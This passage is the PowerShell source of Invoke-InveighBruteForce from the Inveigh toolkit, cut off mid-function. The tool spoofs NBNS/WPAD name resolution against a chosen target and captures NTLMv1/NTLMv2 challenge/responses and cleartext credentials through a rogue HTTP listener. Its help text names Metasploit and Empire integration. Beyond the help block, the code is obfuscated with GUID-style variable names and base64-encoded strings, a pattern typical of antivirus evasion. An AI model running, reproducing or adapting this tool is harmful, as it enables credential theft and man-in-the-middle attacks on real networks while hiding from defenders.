Function Invoke-InveighBruteForce
{
<#
.SYNOPSIS
Invoke-InveighBruteForce is a remote (Hot Potato method)/unprivileged NBNS brute force spoofer.

.DESCRIPTION
Invoke-InveighBruteForce is a remote (Hot Potato method)/unprivileged NBNS brute force spoofer with the following
features:

    Targeted IPv4 NBNS brute force spoofer with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP
    Granular control of console and file output
    Run time control

This function can be used to perform NBNS spoofing across subnets and/or perform NBNS spoofing without an elevated
administrator or SYSTEM shell.

.PARAMETER SpooferIP
Specify an IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the Inveigh Brute Force host.  

.PARAMETER SpooferTarget
Specify an IP address to target for brute force NBNS spoofing. 

.PARAMETER Hostname
Default = WPAD: Specify a hostname for NBNS spoofing.

.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.

.PARAMETER NBNSPause
Default = Disabled: (Integer) Specify the number of seconds the NBNS brute force spoofer will stop spoofing after
an incoming HTTP request is received.

.PARAMETER NBNSTTL
Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: Specify a TCP IP address for the HTTP listener.

.PARAMETER HTTPPort
Default = 80: Specify a TCP port for the HTTP listener.

.PARAMETER HTTPAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not
apply to wpad.dat requests.

.PARAMETER HTTPBasicRealm
Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.

.PARAMETER HTTPResponse
Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat
requests. Use PowerShell character escapes where necessary.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests.
Setting to Anonymous can prevent browser login prompts.

.PARAMETER WPADIP
Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADPort.

.PARAMETER WPADPort
Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADIP.

.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy. Use PowerShell character escapes where necessary.

.PARAMETER WPADResponse
Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and
WPADPort are set.

.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
random challenge will be generated for each request. This will only be used for non-relay captures.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Brute Force through a shell that does not return other output streams. Note that you will not see
the various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
also be enabled.

.PARAMETER RunTime
Default = Unlimited: (Integer) Set the run time duration in minutes.

.PARAMETER RunCount
Default = Unlimited: (Integer) Set the number of captures to perform before auto-exiting.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   

.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 
Import full module and target 192.168.1.11 for 'WPAD' hostname spoofs.

.EXAMPLE
Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1
Target 192.168.1.11 for 'server1' hostname spoofs.

.EXAMPLE
Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -WPADIP 192.168.10.10 -WPADPort 8080
Target 192.168.1.11 for 'WPAD' hostname spoofs and respond to wpad.dat requests with a proxy of 192.168.10.10:8080.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c87a3196a1a84c82a4927bb666567de5}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${b6833b506b8043e88d9b8151a7cef328}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${d6ea7f1fd1834e928a4cacd8f6693cd6}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${b6c439151efe4d60ade7bbf28488d3c8}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${a11f993483f344828781cf5b9c3f336e}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c6049d6770e44ab08cb81b8db8053dfb}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${e3c1295ac79b4a898e098e5001c625e5}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${db8a720fc21c41bb884dc453b5b94946}="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]${c438f2210f0f4ec9ae19444b16db4138}="0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][string]${a82319c2a58b4b90a87c560c5727045b}="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][string]${bbb4484245104b1da9fa046aab15160c}="NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${cf2af60e5f0b4eae8c8234df7276108b}="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${d3d9252b81b34c83866f68fa0030627b}="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${dd1c2678b4764d0296fd04fcfa03a041}="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${b9c6da06dea3463fb4e2486eb58b33a2} = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]${c81dec07ea5b4a20a4ebcbc032800337}="",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]${eba31b45aff8474aa89af338f377fb25}="",
    [parameter(Mandatory=$false)][array]${e0eb5e5670484d639477e9049011be55}="",
    [parameter(Mandatory=$false)][int]${bcb236e03d5f437b8efec36f6a5c7044}="80",
    [parameter(Mandatory=$false)][int]${ae8cde04bacd42438e1eccc463a80909}="",
    [parameter(Mandatory=$false)][int]${c313e4e0c5fa4fdca786cffb25afe4d4}="165",
    [parameter(Mandatory=$false)][int]${c358d7f99b2f421e9b8ba501c0c3c61f}="",
    [parameter(Mandatory=$false)][int]${a4bfbe1821f142c7a8809093cf8457c1}="",
    [parameter(Mandatory=$false)][int]${b4f82f5a600f474c9e8d13dd26e298cd}="",
    [parameter(Mandatory=$false)][string]${dc62541d5d8f462b9742ff6c2fe5ec35}="IIS",
    [parameter(Mandatory=$false)][string]${b99aeade7d42477bb7323da939ca37f5}="",
    [parameter(Mandatory=$false)][string]${cab2ad2fb4c84cc6bc2dab829c3c3bbd}="",   
    [parameter(Mandatory=$false)][string]${a3dcb3194a2c4929a7bf0ab79aa13e81} = "WPAD", 
    [parameter(ValueFromRemainingArguments=$true)]${b1e0501fed684d39aab04d7513ff44f6}
)
if (${b1e0501fed684d39aab04d7513ff44f6})
{
    throw "$(${b1e0501fed684d39aab04d7513ff44f6}) is not a valid parameter."
}
if(!${d3d9252b81b34c83866f68fa0030627b})
{
    ${d3d9252b81b34c83866f68fa0030627b} = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)  
}
if(${b6833b506b8043e88d9b8151a7cef328} -eq 'y' -and !${dd1c2678b4764d0296fd04fcfa03a041})
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAIAAtAFMAcABvAG8AZgBlAHIAVABhAHIAZwBlAHQAIABpAGYAIABlAG4AYQBiAGwAaQBuAGcAIAAtAE4AQgBOAFMA')))
}
if(${b9c6da06dea3463fb4e2486eb58b33a2} -or ${c358d7f99b2f421e9b8ba501c0c3c61f})
{
    if(!${b9c6da06dea3463fb4e2486eb58b33a2})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAIAAtAFcAUABBAEQAUABvAHIAdAAgAHQAbwAgAGcAbwAgAHcAaQB0AGgAIAAtAFcAUABBAEQASQBQAA==')))
    }
    if(!${c358d7f99b2f421e9b8ba501c0c3c61f})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAIAAtAFcAUABBAEQASQBQACAAdABvACAAZwBvACAAdwBpAHQAaAAgAC0AVwBQAEEARABQAG8AcgB0AA==')))
    }
}
if(!${c81dec07ea5b4a20a4ebcbc032800337})
{ 
    ${4c27a8ca4dc2436c9922173f6a7cee5c} = $PWD.Path
}
else
{
    ${4c27a8ca4dc2436c9922173f6a7cee5c} = ${c81dec07ea5b4a20a4ebcbc032800337}
}
if(!${5caffc5f8dd440f7b05ff021bfd90d19})
{
    ${global:5caffc5f8dd440f7b05ff021bfd90d19} = [hashtable]::Synchronized(@{})
    ${5caffc5f8dd440f7b05ff021bfd90d19}.log = New-Object System.Collections.ArrayList
    ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list = New-Object System.Collections.ArrayList
    ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list = New-Object System.Collections.ArrayList
    ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list = New-Object System.Collections.ArrayList
}
if(${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBJAG4AdgBlAGkAZwBoAEIAcgB1AHQAZQBGAG8AcgBjAGUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAsACAAdQBzAGUAIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAA=')))
}
${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_challenge_queue = New-Object System.Collections.ArrayList
${5caffc5f8dd440f7b05ff021bfd90d19}.console_output = $false
${5caffc5f8dd440f7b05ff021bfd90d19}.console_input = $true
${5caffc5f8dd440f7b05ff021bfd90d19}.file_output = $false
${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file = ${4c27a8ca4dc2436c9922173f6a7cee5c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATABvAGcALgB0AHgAdAA=')))
${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_out_file = ${4c27a8ca4dc2436c9922173f6a7cee5c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADEALgB0AHgAdAA=')))
${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_out_file = ${4c27a8ca4dc2436c9922173f6a7cee5c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADIALgB0AHgAdAA=')))
${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_out_file = ${4c27a8ca4dc2436c9922173f6a7cee5c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0AQwBsAGUAYQByAHQAZQB4AHQALgB0AHgAdAA=')))
${5caffc5f8dd440f7b05ff021bfd90d19}.challenge = ${eba31b45aff8474aa89af338f377fb25}
${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof = $false
${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running = $true
if(${a11f993483f344828781cf5b9c3f336e} -eq 'y')
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_output = $true
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_output = $false
}
if(${c6049d6770e44ab08cb81b8db8053dfb} -eq 'y')
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only = $true
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only = $false
}
if(${c438f2210f0f4ec9ae19444b16db4138} -eq 1) 
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.tool = 1
    ${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only = $true
    ${5caffc5f8dd440f7b05ff021bfd90d19}.newline = ""
    ${d6ea7f1fd1834e928a4cacd8f6693cd6} = "N"
}
elseif(${c438f2210f0f4ec9ae19444b16db4138} -eq 2) 
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.tool = 2
    ${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only = $true
    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_input = $false
    ${5caffc5f8dd440f7b05ff021bfd90d19}.newline = "`n"
    ${d6ea7f1fd1834e928a4cacd8f6693cd6} = "Y"
    ${db8a720fc21c41bb884dc453b5b94946} = "N"
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.tool = 0
    ${5caffc5f8dd440f7b05ff021bfd90d19}.newline = ""
}
${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Inveigh Brute Force started at $(Get-Date -format 's')")|Out-Null
${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Brute Force started")]) |Out-Null
if(${b6833b506b8043e88d9b8151a7cef328} -eq 'y')
{   
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NBNS Brute Force Spoofer Target = ${dd1c2678b4764d0296fd04fcfa03a041}")|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NBNS Brute Force Spoofer IP Address = ${d3d9252b81b34c83866f68fa0030627b}")|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NBNS Brute Force Spoofer Hostname = ${a3dcb3194a2c4929a7bf0ab79aa13e81}")|Out-Null
    if(${ae8cde04bacd42438e1eccc463a80909})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NBNS Brute Force Pause = ${ae8cde04bacd42438e1eccc463a80909} Seconds")|Out-Null
    }
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NBNS TTL = ${c313e4e0c5fa4fdca786cffb25afe4d4} Seconds")|Out-Null
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAEIAcgB1AHQAZQAgAEYAbwByAGMAZQAgAFMAcABvAG8AZgBlAHIAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
}
if(${c87a3196a1a84c82a4927bb666567de5} -eq 'y')
{
    if(${cf2af60e5f0b4eae8c8234df7276108b})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("HTTP IP Address = ${cf2af60e5f0b4eae8c8234df7276108b}")|Out-Null
    }
    if(${bcb236e03d5f437b8efec36f6a5c7044} -ne 80)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("HTTP Port = ${bcb236e03d5f437b8efec36f6a5c7044}")|Out-Null
    }
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("HTTP Authentication = ${a82319c2a58b4b90a87c560c5727045b}")|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("WPAD Authentication = ${bbb4484245104b1da9fa046aab15160c}")|Out-Null
    if(${b99aeade7d42477bb7323da939ca37f5})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAdQBzAHQAbwBtACAAUgBlAHMAcABvAG4AcwBlACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
    }
    if(${a82319c2a58b4b90a87c560c5727045b} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -or ${bbb4484245104b1da9fa046aab15160c} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))))
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Basic Authentication Realm = ${dc62541d5d8f462b9742ff6c2fe5ec35}")|Out-Null
    }
    if(${b9c6da06dea3463fb4e2486eb58b33a2} -and ${c358d7f99b2f421e9b8ba501c0c3c61f})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("WPAD = ${b9c6da06dea3463fb4e2486eb58b33a2}`:${c358d7f99b2f421e9b8ba501c0c3c61f}")|Out-Null
        if(${e0eb5e5670484d639477e9049011be55})
        {
            ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEQAaQByAGUAYwB0ACAASABvAHMAdABzACAAPQAgAA=='))) + ${e0eb5e5670484d639477e9049011be55} -join ",")|Out-Null
        }
    }
    elseif(${cab2ad2fb4c84cc6bc2dab829c3c3bbd} -and !${b9c6da06dea3463fb4e2486eb58b33a2} -and !${c358d7f99b2f421e9b8ba501c0c3c61f})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEMAdQBzAHQAbwBtACAAUgBlAHMAcABvAG4AcwBlACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
    }
    if(${eba31b45aff8474aa89af338f377fb25})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("NTLM Challenge = ${eba31b45aff8474aa89af338f377fb25}")|Out-Null
    }
    if(${e3c1295ac79b4a898e098e5001c625e5} -eq 'n')
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBnAG4AbwByAGkAbgBnACAATQBhAGMAaABpAG4AZQAgAEEAYwBjAG8AdQBuAHQAcwA='))))|Out-Null
    }
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
}
if(${d6ea7f1fd1834e928a4cacd8f6693cd6} -eq 'y')
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output = $true
}
else
{
    if(${5caffc5f8dd440f7b05ff021bfd90d19}.tool -eq 1)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA='))))|Out-Null
    }
    else
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
    }
}
if(${b6c439151efe4d60ade7bbf28488d3c8} -eq 'y')
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Output Directory = ${4c27a8ca4dc2436c9922173f6a7cee5c}")|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.file_output = $true
}
else
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
}
if(${b4f82f5a600f474c9e8d13dd26e298cd} -eq 1)
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Run Time = ${b4f82f5a600f474c9e8d13dd26e298cd} Minute")|Out-Null
}
elseif(${b4f82f5a600f474c9e8d13dd26e298cd} -gt 1)
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Run Time = ${b4f82f5a600f474c9e8d13dd26e298cd} Minutes")|Out-Null
}
if(${a4bfbe1821f142c7a8809093cf8457c1})
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Run Count = ${a4bfbe1821f142c7a8809093cf8457c1}")|Out-Null
}
if(${db8a720fc21c41bb884dc453b5b94946} -eq 'y')
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAtAE4AbwB1AG4AIABJAG4AdgBlAGkAZwBoACoAIAB0AG8AIABzAGgAbwB3ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABmAHUAbgBjAHQAaQBvAG4AcwA='))))|Out-Null
    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA=='))))|Out-Null
    if(${5caffc5f8dd440f7b05ff021bfd90d19}.console_output)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA='))))|Out-Null
    }
}
if(${5caffc5f8dd440f7b05ff021bfd90d19}.status_output)
{
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.Count -gt 0)
    {
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only)
        {
            write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0] + ${5caffc5f8dd440f7b05ff021bfd90d19}.newline)
            ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
        }
        else
        {
            switch (${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0])
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))
                {
                    write-warning(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0])
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0])
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
                }
            }
        }
    }
}
${0a2170e8c68e47e4b337d5e21a4de14b} =
{
    Function DataLength
    {
        param ([int]${dc31e9ed601d416ea3ec3dc9d77410e8},[byte[]]${aefdce83c1cd4dfd811233fc2618f47a})
        ${eb29057cd15b46c39ff364e4d1c72e29} = [System.BitConverter]::ToInt16(${aefdce83c1cd4dfd811233fc2618f47a}[${dc31e9ed601d416ea3ec3dc9d77410e8}..(${dc31e9ed601d416ea3ec3dc9d77410e8} + 1)],0)
        return ${eb29057cd15b46c39ff364e4d1c72e29}
    }
    Function DataToString
    {
        param ([int]${eb29057cd15b46c39ff364e4d1c72e29},[int]${d2fe9ebae5fe4e56b7104c4b7a5cabfc},[int]${d5890f7f7ce146e490175ae3cff3d3d5},[int]${e3d619dd244c4180b14bcae6a1139454},[byte[]]${aefdce83c1cd4dfd811233fc2618f47a})
        ${c4d4c442e36945a49772ad36022c24f0} = [System.BitConverter]::ToString(${aefdce83c1cd4dfd811233fc2618f47a}[(${e3d619dd244c4180b14bcae6a1139454}+${d2fe9ebae5fe4e56b7104c4b7a5cabfc}+${d5890f7f7ce146e490175ae3cff3d3d5})..(${e3d619dd244c4180b14bcae6a1139454}+${eb29057cd15b46c39ff364e4d1c72e29}+${d2fe9ebae5fe4e56b7104c4b7a5cabfc}+${d5890f7f7ce146e490175ae3cff3d3d5}-1)])
        ${c4d4c442e36945a49772ad36022c24f0} = ${c4d4c442e36945a49772ad36022c24f0} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${c4d4c442e36945a49772ad36022c24f0} = ${c4d4c442e36945a49772ad36022c24f0}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${7c891f676edd414f9aad1ce02204b60a} = New-Object System.String (${c4d4c442e36945a49772ad36022c24f0},0,${c4d4c442e36945a49772ad36022c24f0}.Length)
        return ${7c891f676edd414f9aad1ce02204b60a}
    }
    Function HTTPListenerStop
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Close()
        start-sleep -s 1
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.server.blocking = $false
        sleep -s 1
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.server.Close()
        sleep -s 1
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Stop()
    }
}
${3e2bf58e2ebd4c4b8e7bdecd2c121915} = 
{ 
    param (${a82319c2a58b4b90a87c560c5727045b},${dc62541d5d8f462b9742ff6c2fe5ec35},${b99aeade7d42477bb7323da939ca37f5},${e3c1295ac79b4a898e098e5001c625e5},${ae8cde04bacd42438e1eccc463a80909},${bbb4484245104b1da9fa046aab15160c},${b9c6da06dea3463fb4e2486eb58b33a2},${c358d7f99b2f421e9b8ba501c0c3c61f},${e0eb5e5670484d639477e9049011be55},${cab2ad2fb4c84cc6bc2dab829c3c3bbd},${a4bfbe1821f142c7a8809093cf8457c1})
    Function NTLMChallengeBase64
    {
        ${9b2aa225f1fa4821bc9be1847c3130fb} = Get-Date
        ${9b2aa225f1fa4821bc9be1847c3130fb} = ${9b2aa225f1fa4821bc9be1847c3130fb}.ToFileTime()
        ${9b2aa225f1fa4821bc9be1847c3130fb} = [BitConverter]::ToString([BitConverter]::GetBytes(${9b2aa225f1fa4821bc9be1847c3130fb}))
        ${9b2aa225f1fa4821bc9be1847c3130fb} = ${9b2aa225f1fa4821bc9be1847c3130fb}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.challenge)
        {
            ${e84f9aa441bc451198f043a81c018d6c} = ${5caffc5f8dd440f7b05ff021bfd90d19}.challenge
            ${b85dd170d0f94766be2d36279655f2f2} = ${5caffc5f8dd440f7b05ff021bfd90d19}.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
